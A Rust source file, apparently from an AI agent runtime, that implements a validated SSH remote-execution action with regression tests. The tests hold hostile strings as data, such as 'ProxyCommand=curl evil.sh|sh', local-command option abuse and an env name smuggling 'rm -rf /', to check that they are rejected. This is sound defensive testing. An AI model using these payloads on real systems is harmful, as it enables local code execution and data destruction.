//! Adhoc-mode fleet admin: `ssh <target> -- <command>` as a typed primitive.
//!
//! This is the **untyped-on-the-wire** mode — we shell out to the local
//! OpenSSH client which then passes our argv to the remote shell. The
//! remote shell sees a normal command. No x0ne-runtime needed on the
//! target. Trade-offs:
//!
//! - ✅ Zero-install: works with any SSH-reachable host (Linux, BSD, macOS,
//!   even some appliances).
//! - ✅ Inherits the user's `~/.ssh/config`: ProxyJump, IdentityFile,
//!   ControlMaster (mux), ServerAliveInterval — all just work.
//! - ❌ Untyped: the remote command's behaviour is shell-defined (cwd quirks,
//!   PATH, locale). For typed + policy-checked + snapshot-able remote
//!   execution, deploy `x0ne-runtime` to the host and route through the
//!   bridge with `mode = "native"`.
//!
//! Security defaults:
//! - **Default-deny in policy.** `SshExec` is NOT in the default-enabled
//!   list. Operators opt in explicitly via `[actions] SshExec = true` or
//!   via `x0ne --enable-ssh`.
//! - **Host inventory** in the orchestrator (`~/.x0ne/hosts.toml`) lets
//!   you scope per-host policy: `confirm` for prod, `allow` for staging.
//! - **`BatchMode=yes`** is forced by default (no interactive password
//!   prompts that could deadlock the agent — failures fail fast).
//! - **`StrictHostKeyChecking=accept-new`** is forced by default. First
//!   connection auto-trusts; subsequent ones must match. To re-pin, the
//!   operator deletes `~/.ssh/known_hosts` line manually — never X0NE.
//! - Shell metacharacters in `command` are rejected. To run a pipeline,
//!   pass `command = "sh"` + `args = ["-c", "<pipeline>"]` — same rule
//!   as `RunCommand`, mirrored for consistency.

use std::collections::HashMap;
use std::process::Stdio;
use std::time::Duration;

use tokio::process::Command;
use tokio::time::timeout;

use crate::action::Action;
use crate::config::AppConfig;
use crate::result::{ActionOutput, ActionResult, ErrorKind};

/// Same shell-meta-detection list as `executor::process` — keep them in
/// sync (the LLM should learn one rule, not two).
const SHELL_METAS: &[&str] = &["&&", "||", "|", ";", ">", "<", "`", "$("];

// The OpenSSH option allowlist lives in `x0ne_actions::ssh_options`, shared
// with the orchestrator's host inventory (H3-2, 2026-10-30).
use x0ne_actions::ssh_options::validate_ssh_option;

pub async fn ssh_exec(action: &Action, _config: &AppConfig) -> ActionResult {
    let Action::SshExec {
        host,
        command,
        args,
        cwd,
        env,
        timeout_secs,
        ssh_options,
    } = action
    else {
        return err("SshExec", ErrorKind::Internal, "wrong action variant");
    };

    if host.trim().is_empty() {
        return err("SshExec", ErrorKind::InvalidInput, "host must be non-empty");
    }
    // SECURITY: `host` is passed as a bare argv token to the local `ssh` binary.
    // A value like `-oProxyCommand=...`, `-F/tmp/evil`, or `-oIdentityFile=...`
    // would be parsed by ssh as an OPTION (positioned before the remote command),
    // enabling local command execution / config override. Reject anything that
    // is not a plain `[user@]hostname` token.
    {
        let h = host.trim();
        let invalid = h.starts_with('-')
            || h.chars()
                .any(|c| c.is_whitespace() || c.is_control() || "$`;|&<>()'\"\\".contains(c));
        if invalid {
            return err(
                "SshExec",
                ErrorKind::InvalidInput,
                "invalid host: expected a plain [user@]hostname with no leading '-', \
                 whitespace, or shell metacharacters",
            );
        }
    }
    // Operator-supplied `-o` options are prefixed with `-o` by build_ssh_argv.
    // Each entry must be a bare `Key=value` whose Key is on the allowlist —
    // several OpenSSH options execute a LOCAL command (see validate_ssh_option).
    for opt in ssh_options.iter() {
        if let Err(reason) = validate_ssh_option(opt) {
            return err("SshExec", ErrorKind::InvalidInput, reason);
        }
    }
    if command.trim().is_empty() {
        return err(
            "SshExec",
            ErrorKind::InvalidInput,
            "command must be non-empty",
        );
    }
    if SHELL_METAS.iter().any(|m| command.contains(m)) {
        return err(
            "SshExec",
            ErrorKind::InvalidInput,
            format!(
                "Shell syntax detected in `command` field. SshExec passes a single program \
                 to the remote shell — it does not parse pipelines. Wrap your command: \
                 {{\"type\":\"SshExec\",\"host\":{:?},\"command\":\"sh\",\"args\":[\"-c\",{:?}]}}.",
                host, command
            ),
        );
    }

    let timeout_duration = Duration::from_secs(timeout_secs.unwrap_or(30));
    let argv = build_ssh_argv(host, command, args, cwd, env, ssh_options);

    let started = std::time::Instant::now();
    let result = timeout(timeout_duration, run_ssh(&argv)).await;
    let duration_ms = started.elapsed().as_millis() as u64;

    match result {
        Ok(Ok((exit_code, stdout, stderr))) => {
            // Distinguish ssh-process failures (exit 255 is OpenSSH's
            // "connection failed / unable to authenticate") from
            // remote-process failures so the error message is actionable.
            let timed_out = false;
            ActionResult::ok(
                "SshExec",
                ActionOutput::CommandOutput {
                    command: format!("ssh {} {}", host, command),
                    args: args.to_vec(),
                    exit_code,
                    stdout,
                    stderr,
                    timed_out,
                    // SshExec does not spill: its output is not captured
                    // through `spawn_capture` and there is no path to hand back.
                    truncated: false,
                    omitted_bytes: 0,
                    stdout_spill_path: None,
                    stderr_spill_path: None,
                    spill_refused: None,
                },
                duration_ms,
            )
        }
        Ok(Err(e)) => {
            let msg = if e.kind() == std::io::ErrorKind::NotFound {
                "openssh client (`ssh`) not found in PATH. Install openssh-client first.".into()
            } else {
                e.to_string()
            };
            ActionResult::err("SshExec", ErrorKind::ExecutionFailed, msg, duration_ms)
        }
        Err(_) => ActionResult::ok(
            "SshExec",
            ActionOutput::CommandOutput {
                command: format!("ssh {} {}", host, command),
                args: args.to_vec(),
                exit_code: -1,
                stdout: String::new(),
                stderr: format!(
                    "ssh round-trip timed out after {}s",
                    timeout_secs.unwrap_or(30)
                ),
                timed_out: true,
                truncated: false,
                omitted_bytes: 0,
                stdout_spill_path: None,
                stderr_spill_path: None,
                spill_refused: None,
            },
            duration_ms,
        ),
    }
}

fn err(action: &str, kind: ErrorKind, msg: impl Into<String>) -> ActionResult {
    ActionResult::err(action, kind, msg, 0)
}

/// Build the argv for the local `ssh` invocation:
///
/// ```text
/// ssh -o BatchMode=yes -o StrictHostKeyChecking=accept-new <user-options>
///     <host>
///     <remote-command-string>
/// ```
///
/// The remote command is built as a single string passed to the remote
/// shell, with proper single-quote escaping of every argv segment so the
/// remote shell sees it as one argv vector.
fn build_ssh_argv(
    host: &str,
    command: &str,
    args: &[String],
    cwd: &Option<String>,
    env: &HashMap<String, String>,
    user_ssh_options: &[String],
) -> Vec<String> {
    let mut out: Vec<String> = Vec::with_capacity(8 + args.len());
    out.push("ssh".into());

    // Defaults that protect the agent from interactive deadlocks.
    out.push("-o".into());
    out.push("BatchMode=yes".into());
    out.push("-o".into());
    out.push("StrictHostKeyChecking=accept-new".into());
    out.push("-o".into());
    out.push("ConnectTimeout=15".into());

    // User-provided -o options come after defaults so the operator can
    // override (e.g. `BatchMode=no` if they really want a prompt).
    for opt in user_ssh_options {
        out.push("-o".into());
        out.push(opt.clone());
    }

    out.push(host.to_string());

    // Build the remote command string: env exports + optional cd + cmd args.
    // Everything is single-quote-escaped to survive the remote shell.
    let mut remote = String::new();
    for (k, v) in env {
        // Reject keys with shell-meta to avoid injection via env name.
        if !k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
            // Quietly skip — alternative is hard fail; we go with skip
            // because env names are usually agent-controlled.
            continue;
        }
        remote.push_str(k);
        remote.push('=');
        remote.push_str(&shell_single_quote(v));
        remote.push(' ');
    }
    if let Some(dir) = cwd {
        remote.push_str("cd ");
        remote.push_str(&shell_single_quote(dir));
        remote.push_str(" && ");
    }
    remote.push_str(&shell_single_quote(command));
    for arg in args {
        remote.push(' ');
        remote.push_str(&shell_single_quote(arg));
    }
    out.push(remote);
    out
}

/// Single-quote-wrap a string for the POSIX `sh`. `'` in the source becomes
/// `'\''`. Idempotent: never panics, never strips bytes.
fn shell_single_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for c in s.chars() {
        if c == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

async fn run_ssh(argv: &[String]) -> std::io::Result<(i32, String, String)> {
    let mut cmd = Command::new(&argv[0]);
    // SECURITY: cleared environment (`crate::child_env`). ssh is the primitive
    // that most obviously carries the host's secrets somewhere else — a leak
    // here does not merely reach the transcript, it reaches the remote machine.
    // The allowlist deliberately keeps `SSH_AUTH_SOCK`, `HOME` and `USER`,
    // because without them ssh cannot authenticate at all and the `x0ne cc`
    // chantier stops working; the action's own env travels as `K='v'` prefixes
    // in the REMOTE shell line (`build_ssh_argv`), not through this process.
    crate::child_env::harden(&mut cmd);
    for a in &argv[1..] {
        cmd.arg(a);
    }
    cmd.stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    let output = cmd.output().await?;
    let exit_code = output.status.code().unwrap_or(-1);
    let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
    let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
    Ok((exit_code, stdout, stderr))
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// SECURITY regression (August 2026 audit, finding 2): `ssh_options` was
    /// only rejected for a leading `-` or a newline, so `ProxyCommand=...`
    /// passed validation and OpenSSH ran it through /bin/sh on the LOCAL host
    /// — turning a remote-exec primitive into local RCE.
    #[test]
    fn ssh_options_reject_local_command_execution() {
        for evil in [
            "ProxyCommand=curl evil.sh|sh",
            "proxycommand=curl evil.sh|sh",  // case-insensitive
            "  ProxyCommand = curl evil.sh", // whitespace padding
            "LocalCommand=touch /tmp/pwned",
            "PermitLocalCommand=yes",
            "ProxyJump=attacker",
            "KnownHostsCommand=/tmp/evil",
            "Match=exec \"touch /tmp/x\"",
            "Include=/tmp/evil_config",
        ] {
            assert!(
                validate_ssh_option(evil).is_err(),
                "dangerous ssh option must be rejected: {evil}"
            );
        }
    }

    #[test]
    fn ssh_options_allow_benign_keys() {
        for ok in [
            "ConnectTimeout=5",
            "StrictHostKeyChecking=accept-new",
            "BatchMode=yes",
            "Port=2222",
            "ServerAliveInterval=30",
        ] {
            assert!(
                validate_ssh_option(ok).is_ok(),
                "benign ssh option must be allowed: {ok}"
            );
        }
    }

    #[test]
    fn ssh_options_reject_unknown_and_malformed() {
        // Unknown keys are denied (allowlist, not denylist).
        assert!(validate_ssh_option("SomeFutureOption=1").is_err());
        // Still reject flags and newline smuggling.
        assert!(validate_ssh_option("-oProxyCommand=x").is_err());
        assert!(validate_ssh_option("ConnectTimeout=5\nProxyCommand=x").is_err());
        // Missing '=' is malformed.
        assert!(validate_ssh_option("ProxyCommand").is_err());
    }

    #[test]
    fn shell_single_quote_handles_apostrophes() {
        assert_eq!(shell_single_quote("hi"), "'hi'");
        assert_eq!(shell_single_quote("it's"), r"'it'\''s'");
        // Empty
        assert_eq!(shell_single_quote(""), "''");
        // Multiple
        assert_eq!(shell_single_quote("'''"), r"''\'''\'''\'''");
    }

    #[test]
    fn build_ssh_argv_minimum() {
        let argv = build_ssh_argv("user@host", "uptime", &[], &None, &HashMap::new(), &[]);
        // Defaults are present
        assert!(argv.iter().any(|a| a == "BatchMode=yes"));
        assert!(argv.iter().any(|a| a == "StrictHostKeyChecking=accept-new"));
        assert_eq!(argv[argv.len() - 2], "user@host");
        assert_eq!(argv[argv.len() - 1], "'uptime'");
    }

    #[test]
    fn build_ssh_argv_with_args_and_cwd() {
        let argv = build_ssh_argv(
            "host",
            "ls",
            &["-la".into(), "/var/log".into()],
            &Some("/tmp".into()),
            &HashMap::new(),
            &[],
        );
        let last = argv.last().unwrap();
        assert!(last.starts_with("cd '/tmp' && 'ls' '-la' '/var/log'"));
    }

    #[test]
    fn build_ssh_argv_env_variables_are_exported() {
        let mut env = HashMap::new();
        env.insert("DEBUG".into(), "1".into());
        env.insert("TOKEN".into(), "shh secret".into());
        let argv = build_ssh_argv("host", "node", &["app.js".into()], &None, &env, &[]);
        let last = argv.last().unwrap();
        // Both keys should be in the remote command
        assert!(last.contains("DEBUG="));
        assert!(last.contains("TOKEN="));
        // The space-containing value must be properly quoted
        assert!(last.contains("'shh secret'"));
    }

    #[test]
    fn build_ssh_argv_skips_invalid_env_names() {
        let mut env = HashMap::new();
        env.insert("FOO; rm -rf /".into(), "evil".into());
        env.insert("OK".into(), "value".into());
        let argv = build_ssh_argv("host", "echo", &[], &None, &env, &[]);
        let last = argv.last().unwrap();
        assert!(last.contains("OK="));
        assert!(
            !last.contains("FOO; rm"),
            "must not pass through shell-meta env name"
        );
    }

    #[tokio::test]
    async fn rejects_shell_metas_in_command() {
        let action = Action::SshExec {
            host: "host".into(),
            command: "ls | grep foo".into(),
            args: vec![],
            cwd: None,
            env: HashMap::new(),
            timeout_secs: None,
            ssh_options: vec![],
        };
        let r = ssh_exec(&action, &AppConfig::defaults()).await;
        assert!(!r.success);
        assert!(r
            .error
            .as_ref()
            .map(|e| e.message.contains("Shell syntax"))
            .unwrap_or(false));
    }

    #[tokio::test]
    async fn rejects_empty_host() {
        let action = Action::SshExec {
            host: "  ".into(),
            command: "uptime".into(),
            args: vec![],
            cwd: None,
            env: HashMap::new(),
            timeout_secs: None,
            ssh_options: vec![],
        };
        let r = ssh_exec(&action, &AppConfig::defaults()).await;
        assert!(!r.success);
    }

    #[tokio::test]
    async fn rejects_empty_command() {
        let action = Action::SshExec {
            host: "host".into(),
            command: "".into(),
            args: vec![],
            cwd: None,
            env: HashMap::new(),
            timeout_secs: None,
            ssh_options: vec![],
        };
        let r = ssh_exec(&action, &AppConfig::defaults()).await;
        assert!(!r.success);
    }
}
